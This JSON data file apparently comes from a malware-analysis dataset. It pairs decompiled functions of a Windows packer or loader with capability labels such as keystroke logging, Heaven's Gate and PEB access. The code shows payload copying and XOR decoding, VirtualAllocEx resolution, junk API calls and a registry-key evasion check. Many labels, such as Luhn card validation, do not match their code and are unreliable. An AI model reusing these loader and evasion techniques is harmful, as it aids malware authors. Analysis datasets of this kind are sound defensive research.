{
    "004011f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.004011f0(void)\n\n{\n    uint var_4h;\n    \n    return *(*0x41adcc + -4);\n}\n",
        "token_count": 33
    },
    "004018f0": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.004018f0(void)\n\n{\n    for (*0x41add8 = 0x21; *0x41add8 < 0x1487ce1b; *0x41add8 = *0x41add8 + 5) {\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00401930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00401930(void)\n\n{\n    uint var_4h;\n    \n    *0x41ae30 = (**0x41ae00)(0x80000000, *0x40800c, 0x41ae0c);\n    if (*0x41ae30 == 0) {\n        return;\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 94
    },
    "00401970": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00401970(void)\n\n{\n    *0x41add8 = 0;\n    *(*0x40800c + 0x13) = 0x2d;\n    *(*0x40800c + *0x41add8 + 0x14) = *0x41add8 + 'b';\n    *(*0x40800c + *0x41add8 + 0x15) = *0x41add8 + '8';\n    *(*0x40800c + *0x41add8 + 0x16) = *0x41add8 + '3';\n    *(*0x40800c + *0x41add8 + 0x17) = *0x41add8 + '4';\n    *(*0x40800c + *0x41add8 + 0x18) = *0x41add8 + '-';\n    *(*0x40800c + *0x41add8 + 0x19) = *0x41add8 + '1';\n    *(*0x40800c + *0x41add8 + 0x1a) = *0x41add8 + '1';\n    *(*0x40800c + *0x41add8 + 0x1b) = *0x41add8 + 'd';\n    *(*0x40800c + *0x41add8 + 0x1c) = *0x41add8 + '0';\n    *(*0x40800c + *0x41add8 + 0x1d) = *0x41add8 + '-';\n    *(*0x40800c + *0x41add8 + 0x1e) = *0x41add8 + '9';\n    *(*0x40800c + *0x41add8 + 0x1f) = *0x41add8 + '3';\n    *(*0x40800c + *0x41add8 + 0x20) = *0x41add8 + '2';\n    *(*0x40800c + *0x41add8 + 0x21) = *0x41add8 + 'f';\n    *(*0x40800c + *0x41add8 + 0x22) = *0x41add8 + '-';\n    *(*0x40800c + *0x41add8 + 0x23) = *0x41add8 + '0';\n    *(*0x40800c + *0x41add8 + 0x24) = *0x41add8 + '0';\n    *(*0x40800c + *0x41add8 + 0x25) = *0x41add8 + 'a';\n    *(*0x40800c + *0x41add8 + 0x26) = *0x41add8 + '0';\n    *(*0x40800c + *0x41add8 + 0x27) = *0x41add8 + 'c';\n    *(*0x40800c + *0x41add8 + 0x28) = *0x41add8 + '9';\n    *(*0x40800c + *0x41add8 + 0x29) = *0x41add8 + '0';\n    *(*0x40800c + *0x41add8 + 0x2a) = *0x41add8 + 'd';\n    *(*0x40800c + *0x41add8 + 0x2b) = *0x41add8 + 'c';\n    *(*0x40800c + *0x41add8 + 0x2c) = *0x41add8 + 'a';\n    *(*0x40800c + *0x41add8 + 0x2d) = *0x41add8 + 'a';\n    *(*0x40800c + *0x41add8 + 0x2e) = *0x41add8 + '9';\n    *(*0x40800c + *0x41add8 + 0x2f) = *0x41add8 + '}';\n    *(*0x40800c + *0x41add8 + 0x30) = 0;\n    *(*0x40800c + *0x41add8) = *0x41add8 + 'i';\n    *(*0x40800c + *0x41add8 + 1) = *0x41add8 + 'n';\n    *(*0x40800c + *0x41add8 + 2) = *0x41add8 + 't';\n    *(*0x40800c + *0x41add8 + 3) = *0x41add8 + 'e';\n    *(*0x40800c + *0x41add8 + 4) = *0x41add8 + 'r';\n    *(*0x40800c + *0x41add8 + 5) = *0x41add8 + 'f';\n    *(*0x40800c + *0x41add8 + 6) = *0x41add8 + 'a';\n    *(*0x40800c + *0x41add8 + 7) = *0x41add8 + 'c';\n    *(*0x40800c + *0x41add8 + 8) = *0x41add8 + 'e';\n    *(*0x40800c + *0x41add8 + 9) = *0x41add8 + '\\\\';\n    *(*0x40800c + *0x41add8 + 10) = *0x41add8 + '{';\n    *(*0x40800c + *0x41add8 + 0xb) = *0x41add8 + 'a';\n    *(*0x40800c + *0x41add8 + 0xc) = *0x41add8 + 'a';\n    *(*0x40800c + *0x41add8 + 0xd) = *0x41add8 + '5';\n    *(*0x40800c + *0x41add8 + 0xe) = *0x41add8 + 'b';\n    *(*0x40800c + *0x41add8 + 0xf) = *0x41add8 + '6';\n    *(*0x40800c + *0x41add8 + 0x10) = *0x41add8 + 'a';\n    *(*0x40800c + *0x41add8 + 0x11) = *0x41add8 + '8';\n    *(*0x40800c + *0x41add8 + 0x12) = *0x41add8 + '0';\n    return;\n}\n",
        "token_count": 1499
    },
    "00401090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401090(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004018f0();\n    *0x41adc4 = arg_8h;\n    *0x41ae00 = _sym.imp.ADVAPI32.dll_RegOpenKeyA;\n    *0x41ada4 = &stack0xfffffffc;\n    fcn.004016b0();\n    *0x41ae04 = _sym.imp.ADVAPI32.dll_RegQueryValueExA;\n    *0x41adcc = fcn.00401370();\n    fcn.004017b0();\n    *0x41adb0 = 0;\n    *0x41adb4 = 0;\n    *0x41adac = 1;\n    while (*0x41ade4 = fcn.00401df0(*0x408008, *0x41ad90),  *0x41adb0 < *0x41ad8c) {\n        fcn.00401640(0x17);\n        *0x41ad94 = *0x41ade4;\n        *0x41adb4 = *0x41adac + *0x408008 + *0x41adb4;\n        *0x41adb0 = *0x408008 + *0x41adb0;\n        *0x41ad90 = *0x41ad90 - *0x41ade4;\n    }\n    uVar1 = fcn.00401850(4, 0x241);\n    return uVar1;\n}\n",
        "token_count": 355
    },
    "00401370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00401370(void)\n\n{\n    int32_t iVar1;\n    uint var_296h;\n    uint var_224h;\n    uint var_172h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    var_4h = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    *0x41adc0 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    *0x41ae08 = *(*0x41adc0 + 0x3c);\n    var_ch = 200;\n    var_8h = 1;\n    while (iVar1 = (**0x41ae04)(*0x41ae0c, 0x41ade8, 0, &var_8h, &var_d8h, &var_ch),  iVar1 != 0) {\n        fcn.00401370();\n    }\n    if (var_d8h._3_1_ == 't') {\n        *0x41ae10 = 0x4080a4;\n    }\n    *0x408074 = *0x408074 - 0x14d;\n    if ((*0x41adc0 < *0x408074) && (*0x408074 < *0x41adc0 + *(*0x41adc0 + *0x41ae08 + 0x50) * 4)) {\n        *0x41ad98 = 0;\n    }\n    else {\n        *0x41adc0 = *0x41adc4;\n        *0x41ad98 = 1;\n    }\n    return *0x41ae10;\n}\n",
        "token_count": 376
    },
    "00401640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401640(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *0x41add0 + *0x41adb0;\n    iVar2 = *0x41adcc + *0x41adb4;\n    for (var_8h = 0; var_8h < *0x41ade4; var_8h = var_8h + 1) {\n        *(iVar1 + var_8h) = *(iVar2 + var_8h);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004016d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004016d0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    **0x41ae14 = arg_ch + **0x41ae14;\n    return;\n}\n",
        "token_count": 54
    },
    "00401740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401740(void)\n\n{\n    *0x41ae2c = **0x41ae18;\n    *0x41ae24 = *0x41ae20 - 2;\n    *0x41ae28 = *0x41ae2c ^ *0x41ae20;\n    **0x41ae18 = *0x41ae28;\n    return;\n}\n",
        "token_count": 87
    },
    "004017b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpLibFileName\n\nvoid __fastcall fcn.004017b0(uint param_1)\n\n{\n    uint uVar1;\n    uint lpLibFileName;\n    \n    for (*0x41add8 = 0x21; *0x41add8 < 0x1fb451b; *0x41add8 = *0x41add8 + 4) {\n    }\n    *0x41ad8c = fcn.004011f0(1, param_1);\n    *0x41add8 = *0x41ad8c;\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"kernel32\", \"VirtualAllocEx\");\n    *0x41adfc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    fcn.00401000(2);\n    return;\n}\n",
        "token_count": 195
    },
    "00401830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401830(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    return arg_8h * 0x229;\n}\n",
        "token_count": 42
    },
    "00401850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401850(void)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < *0x41ad8c; var_4h = var_4h + 4) {\n        *0x41ae14 = *0x41add0 + var_4h;\n        fcn.004016d0(0x7d, var_4h);\n        *0x41ae20 = var_4h + 0xddc0;\n        *0x41ae18 = *0x41ae14;\n        fcn.00401700();\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00401920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401920(int32_t arg_8h)\n\n{\n    return arg_8h + 0x13f7;\n}\n",
        "token_count": 36
    },
    "00401df0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401df0(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < arg_ch) {\n        arg_ch = arg_8h;\n    }\n    return arg_ch;\n}\n",
        "token_count": 77
    },
    "00401230": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00401230(void)\n\n{\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.GDI32.dll_GetTextAlign)(3, 3, 3, 3, 3, 3, 3, 3, 3, 3);\n    (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    (*_sym.imp.GDI32.dll_GetDCPenColor)(3);\n    (*_sym.imp.USER32.dll_GetClipboardOwner)();\n    (*_sym.imp.USER32.dll_GetThreadDesktop)(3);\n    (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n    (*_sym.imp.USER32.dll_DestroyWindow)(3);\n    (*_sym.imp.GDI32.dll_CloseMetaFile)(3);\n    (*_sym.imp.USER32.dll_GetKeyState)(3);\n    (*_sym.imp.USER32.dll_IsIconic)(3);\n    (*_sym.imp.GDI32.dll_CreateMetaFileA)(\"cFoCOkLxG \");\n    (*_sym.imp.USER32.dll_GetTopWindow)(3);\n    (*_sym.imp.GDI32.dll_FillPath)(3);\n    (*_sym.imp.USER32.dll_GetSysColor)(3);\n    (*_sym.imp.USER32.dll_GetListBoxInfo)(3);\n    (*_sym.imp.USER32.dll_GetKeyState)(3);\n    (*_sym.imp.GDI32.dll_GetFontLanguageInfo)(3);\n    (*_sym.imp.GDI32.dll_GetSystemPaletteUse)(3);\n    (*_sym.imp.GDI32.dll_GetSystemPaletteUse)(3);\n    (*_sym.imp.GDI32.dll_GetLayout)(3);\n    (*_sym.imp.USER32.dll_IsWindowVisible)(3);\n    return;\n}\n",
        "token_count": 555
    }
}